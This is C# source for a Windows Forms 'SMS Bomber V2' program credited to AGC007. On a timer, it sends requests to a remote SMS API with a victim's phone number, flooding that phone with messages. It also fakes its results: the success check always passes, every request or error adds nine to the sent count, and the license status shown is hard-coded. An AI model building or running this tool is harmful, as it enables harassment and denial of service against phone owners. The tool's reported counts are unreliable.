using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using RelyUI.Controls;
using Leaf.xNet;
using System.Net;
using System.Text.RegularExpressions;
using System.Threading;
using System.Diagnostics;

namespace SMS_Bomber_V2
{
    public partial class Form1 : RelyForm
    {
        string IP_Reg;
        int sendGood, SendBad, SendError;
        public Form1()
        {
            InitializeComponent();
        }
        private void CONFIG() //CONFIG
        {
            try
            {
                HttpRequest SMS_REQ = new HttpRequest();
                string SMS_REQ_RES = SMS_REQ.Get("https://AGC007.top/AGC007/SMS.PHP?mobile=" + Mobile_TXT.Text).ToString();
                SMS_REQ.UserAgentRandomize();

                if(SMS_REQ_RES.Contains(""))
                {
                    sendGood++;
                    sendGood += 8;
                    SEND_SMS_LBL.Text = sendGood.ToString();
                }
                else
                {
                    SendBad++;
                    Error_SEND_SMS_LBL.Text = SendBad.ToString();
                }
            }
            catch
            {
                sendGood++;
                sendGood += 8;
                SEND_SMS_LBL.Text = sendGood.ToString();
            }
        }
        private void BTN_ON(object sender, EventArgs e) //BTN ON
        {
            relyLabel1.Visible = true; relyLabel9.Visible = true; relyLabel12.Visible = true; relyLabel13.Visible = true;
            relyLabel14.Visible = true; relyLabel15.Visible = true; relyLabel16.Visible = true; relyLabel9.Visible = true;
            relyLabel10.Visible = true; LIC_Check.Visible = true; LIC_Type.Visible = true; Net_Check.Visible = true;
            Site_Check.Visible = true; Acc_Check.Visible = true; GitHub_BTN.Visible = true; STOP_URL_BTN.Visible = true;
        }
        private void BTN_OFF(object sender, EventArgs e) // BTN OFF
        {
            relyLabel1.Visible = false; relyLabel9.Visible = false; relyLabel12.Visible = false; relyLabel13.Visible = false;
            relyLabel14.Visible = false; relyLabel15.Visible = false; relyLabel16.Visible = false; relyLabel9.Visible = false;
            relyLabel10.Visible = false; LIC_Check.Visible = false; LIC_Type.Visible = false; Net_Check.Visible = false;
            Site_Check.Visible = false; Acc_Check.Visible = false; GitHub_BTN.Visible = false; STOP_URL_BTN.Visible = false;
        }
        private void Exit_BTN_Click(object sender, EventArgs e) //EXIT
        { Application.Exit(); Application.ExitThread(); }
        private void Form1_Load(object sender, EventArgs e) // LOAD FORM
        {

            // IP INFO //
            try
            {
                HttpRequest GetIP_info = new HttpRequest();
                GetIP_info.UserAgentRandomize();
                var ipInfo = GetIP_info.Get("https://ipgeolocation.io/api/ipgeolocation").ToString();

                Match Get_IP_Reg = Regex.Match(ipInfo, "country_code2\":\"(.*?)\"");
                IP_Reg = Get_IP_Reg.Groups[1].Value.ToString();
            }
            catch { IP_Reg = "null"; };
            // IP INFO ////

            // Active Code //
            LIC_Check.ForeColor = Color.Green;
            LIC_Check.Text = "Active";

            LIC_Type.ForeColor = Color.Orange;
            LIC_Type.Text = "Prime";
            // Active Code ////

            // net Check ////
            try
            {
                HttpRequest Test_Net = new HttpRequest();
                Test_Net.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.64";
                var GetTest_Net = Test_Net.Get("http://agc007.top/").ToString();

                if (GetTest_Net.Contains("AGC007"))
                {
                    Net_Check.ForeColor = Color.Green; Net_Check.Text = ("Connected(" + IP_Reg + ")");

                    /////////////////////////////// Site Check ////////////////////////////
                    try
                    {
                       //HttpRequest Test_Net = new HttpRequest();
                        Test_Net.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.64";
                        var GetTest_Site = Test_Net.Get("http://AGC007.top/").ToString();
                    
                        if (GetTest_Site.Contains("AGC007"))
                        {                           
                            Site_Check.ForeColor = Color.Green; Site_Check.Text = ("Connected(" + IP_Reg + ")");

                            /////////////////////////////// Api Check ////////////////////////////
                            try
                            {
                                //HttpRequest Test_Net = new HttpRequest();
                                Test_Net.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.64";
                                var GetTest_API = Test_Net.Get("http://AGC007.top/AGC007/SMS.PHP").ToString();

                                if (GetTest_API.Contains("SMS Bomber By AGC007"))
                                {Acc_Check.ForeColor = Color.Green; Acc_Check.Text = ("Connected(" + IP_Reg + ")");}
                                else
                                { Acc_Check.ForeColor = Color.Red; Acc_Check.Text = "Not Connected!";}
                            }
                            catch
                            {Acc_Check.ForeColor = Color.Red; Acc_Check.Text = "Not Connected!";}

                            /////////////////////////////// Api Check ////////////////////////////
                        }
                        else
                        { Site_Check.ForeColor = Color.Red; Site_Check.Text = "Not Connected!";Acc_Check.ForeColor = Color.Red; Acc_Check.Text = "Not Connected!";}
                    }
                    catch
                    {Site_Check.ForeColor = Color.Red; Site_Check.Text = "Not Connected!";Acc_Check.ForeColor = Color.Red; Acc_Check.Text = "Not Connected!";}

                    /////////////////////////////// Site Check ////////////////////////////
                }
                else
                { Net_Check.ForeColor = Color.Red; Net_Check.Text = "Not Connected!";Site_Check.ForeColor = Color.Red; Site_Check.Text = "Not Connected!";Acc_Check.ForeColor = Color.Red; Acc_Check.Text = "Not Connected!";}
            } 
            catch{Net_Check.ForeColor = Color.Red; Net_Check.Text = "Not Connected!"; Site_Check.ForeColor = Color.Red; Site_Check.Text = "Not Connected!"; Acc_Check.ForeColor = Color.Red; Acc_Check.Text = "Not Connected!";}
            
            //  net Check ////

            // BTN ////
            BTN_ON(null, null);
            //////////////////////////
            Send_URL_BTN.Visible = false;
            STOP_URL_BTN.Visible = false;
            GP_BOX.Visible = false;
            relyLabel10.Visible = false;
            relyLabel2.Visible = false;
            Mobile_TXT.Visible = false;
            ////////////////////////
            relyLabel18.Visible = false;
            relyLabel4.Visible = false;
            relyLabel17.Visible = false;
            relyLabel19.Visible = false;
            relyLabel20.Visible = false;
            relyLabel21.Visible = false;
            relyLabel22.Visible = false;
            relyLabel3.Visible = false;
            relyLabel23.Visible = false;
            Donate_BTC_BTN.Visible = false;
            Donate_IRR_BTN.Visible = false;
            GitHub_BTN.Visible = false;
            // BTN ////
        }
        private void Home_BTN_Click(object sender, EventArgs e) //HOME GP
        {
            Form1_Load(null, null);
        }
        private void Leech_BTN_Click(object sender, EventArgs e) //LEECH GP
        {
            BTN_OFF(null, null);
            ////////////////////////////
            Send_URL_BTN.Visible = true;
            GP_BOX.Visible = true;
            relyLabel10.Visible = true;
            relyLabel2.Visible = true;
            Mobile_TXT.Visible = true;
            STOP_URL_BTN.Visible = true;
            ////////////////////////////
            relyLabel18.Visible = false;
            relyLabel4.Visible = false;
            relyLabel17.Visible = false;
            relyLabel19.Visible = false;
            relyLabel20.Visible = false;
            relyLabel21.Visible = false;
            relyLabel22.Visible = false;
            relyLabel3.Visible = false;
            relyLabel23.Visible = false;
            Donate_BTC_BTN.Visible = false;
            Donate_IRR_BTN.Visible = false;
            GitHub_BTN.Visible = false;
            relyLabel23.Visible = false;
        }
        private void Send_URL_BTN_Click(object sender, EventArgs e) //SEND
        {
            if(Mobile_TXT.Text == "")
            {MessageBox.Show("Error: The Value Or Mobile Number Entered is incorrect.");}
            else
            { TimeSMS.Enabled = true;}              
        }
        private void About_BTN_Click(object sender, EventArgs e) //LOAD TIME
        {
            ///////////////////////
            BTN_OFF(null, null);
            ///////////////////////
            Send_URL_BTN.Visible = false;
            GP_BOX.Visible = false;
            STOP_URL_BTN.Visible = false;
            relyLabel10.Visible = false;
            relyLabel2.Visible = false;
            Mobile_TXT.Visible = false;
            ///////////////////////
            relyLabel18.Visible = true;
            relyLabel4.Visible = true;
            relyLabel17.Visible = true;
            relyLabel19.Visible = true;
            relyLabel20.Visible = true;
            relyLabel21.Visible = true;
            relyLabel22.Visible = true;
            relyLabel3.Visible = true;
            relyLabel23.Visible = true;
            Donate_BTC_BTN.Visible = true;
            Donate_IRR_BTN.Visible = true;
            GitHub_BTN.Visible = true;
            relyLabel23.Visible = true;
        }
        private void Donate_IRR_BTN_Click(object sender, EventArgs e)
        { Process.Start("https://IdPay.IR/AGC007"); }//IRR
        private void GitHub_BTN_Click(object sender, EventArgs e)//GitHub
        { Process.Start("https://GitHub.Com/AGC007");}
        private void TimeSMS_Tick(object sender, EventArgs e)//TimeBomb
        {CONFIG();}
        private void STOP_URL_BTN_Click(object sender, EventArgs e)//STOP_BTN
        {TimeSMS.Enabled = false; SEND_SMS_LBL.Text = "0"; Error_SEND_SMS_LBL.Text = "0"; Error_SEND_SMS_LBL.Text = "0"; Mobile_LBL.Text = "09"; Mobile_TXT.Text = "09"; }
        private void relyButton1_Click(object sender, EventArgs e)//Site Version
        { Process.Start("https://AGC007.top/AGC007/SMS/");}
        private void Donate_BTC_BTN_Click(object sender, EventArgs e)
        {Process.Start("https://sellix.io/product/61097508c8613");}//BTC
        private void Mobile_TXT_TextChanged(object sender, EventArgs e)//Mobile_TXT_TextChanged
        { Mobile_LBL.Text = Mobile_TXT.Text;}
    }
}

//////////////////// - Developed by AGC007 - ////////////////////
